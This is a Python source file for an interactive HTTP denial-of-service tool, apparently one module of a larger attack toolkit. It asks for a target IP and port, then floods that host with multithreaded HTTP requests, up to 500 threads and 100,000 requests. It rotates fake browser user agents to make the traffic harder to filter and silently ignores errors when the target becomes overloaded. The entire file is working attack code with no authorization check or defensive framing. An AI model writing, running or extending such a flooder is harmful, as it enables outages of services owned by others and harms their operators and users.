import threading
import urllib.request
import urllib.error
import random
import time
import socket
from ui.console import cprint, iprint, wprint, eprint, cinput


class HTTPDOSAttack:
    """HTTP Denial of Service attack using request flooding"""
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
    ]
    
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.thread_count = 50
        self.request_count = 1000
        self.running = False
        self.request_sent_count = 0
        self.lock = threading.Lock()
    
    def validate_target(self, ip_address):
        """Validate IP address format"""
        try:
            socket.inet_aton(ip_address)
            return True
        except socket.error:
            return False
    
    def get_random_user_agent(self):
        """Return a random user agent string"""
        return random.choice(self.USER_AGENTS)
    
    def send_request(self):
        """Send HTTP request to target"""
        if not self.running:
            return
        
        try:
            url = f"http://{self.target_ip}:{self.target_port}/"
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=2):
                pass
            
            with self.lock:
                self.request_sent_count += 1
                if self.request_sent_count % 50 == 0:
                    iprint(f"Requests sent: {self.request_sent_count}")
        
        except (urllib.error.URLError, socket.timeout, ConnectionRefusedError, ConnectionResetError):
            # Silently continue - target may be overloaded or offline
            pass
        except Exception:
            # Catch all other exceptions and continue
            pass
    
    def worker_thread(self):
        """Worker thread that sends multiple requests"""
        for _ in range(self.request_count // self.thread_count):
            if not self.running:
                break
            self.send_request()
    
    def run_attack(self):
        """Execute the HTTP DOS attack"""
        try:
            iprint(f"\n[*] Starting attack on {self.target_ip}:{self.target_port}")
            iprint(f"[*] Threads: {self.thread_count} | Requests per thread: {self.request_count // self.thread_count}")
            iprint(f"[*] Total requests: ~{self.request_count}\n")
            
            self.running = True
            self.request_sent_count = 0
            threads = []
            
            # Start worker threads
            for _ in range(self.thread_count):
                t = threading.Thread(target=self.worker_thread, daemon=True)
                t.start()
                threads.append(t)
            
            # Wait for all threads to complete
            for t in threads:
                t.join()
            
            self.running = False
            iprint(f"\n[+] Attack completed! Total requests sent: {self.request_sent_count}")
        
        except KeyboardInterrupt:
            self.running = False
            wprint("\n[-] Attack stopped by user")
    
    def run_interactive(self):
        """Interactive mode for HTTP DOS attack"""
        try:
            cprint("\n=== HTTP DOS Attack ===\n")
            
            # Get target IP
            while True:
                ip_input = cinput("Enter target IP address: ")
                if self.validate_target(ip_input):
                    self.target_ip = ip_input
                    break
                else:
                    eprint("Invalid IP address format")
            
            # Get target port
            while True:
                try:
                    port_input = cinput("Enter target port [80]: ")
                    if not port_input:
                        self.target_port = 80
                        break
                    port_num = int(port_input)
                    if 1 <= port_num <= 65535:
                        self.target_port = port_num
                        break
                    else:
                        eprint("Port must be between 1 and 65535")
                except ValueError:
                    eprint("Invalid port number")
            
            # Get thread count
            while True:
                try:
                    thread_input = cinput("Number of concurrent threads [50]: ")
                    if not thread_input:
                        self.thread_count = 50
                        break
                    threads = int(thread_input)
                    if 1 <= threads <= 500:
                        self.thread_count = threads
                        break
                    else:
                        eprint("Threads must be between 1 and 500")
                except ValueError:
                    eprint("Invalid thread count")
            
            # Get request count
            while True:
                try:
                    request_input = cinput("Number of total requests [1000]: ")
                    if not request_input:
                        self.request_count = 1000
                        break
                    requests = int(request_input)
                    if 100 <= requests <= 100000:
                        self.request_count = requests
                        break
                    else:
                        eprint("Requests must be between 100 and 100000")
                except ValueError:
                    eprint("Invalid request count")
            
            # Display configuration
            cprint("\n[*] Configuration:")
            iprint(f"    Target: {self.target_ip}:{self.target_port}")
            iprint(f"    Threads: {self.thread_count}")
            iprint(f"    Total Requests: {self.request_count}")
            iprint("    Status: Ready to attack\n")
            
            # Start attack
            self.run_attack()
        
        except KeyboardInterrupt:
            self.running = False
            wprint("\n[-] Attack cancelled by user")
        
        finally:
            cinput("\nPress Enter to return to menu...")
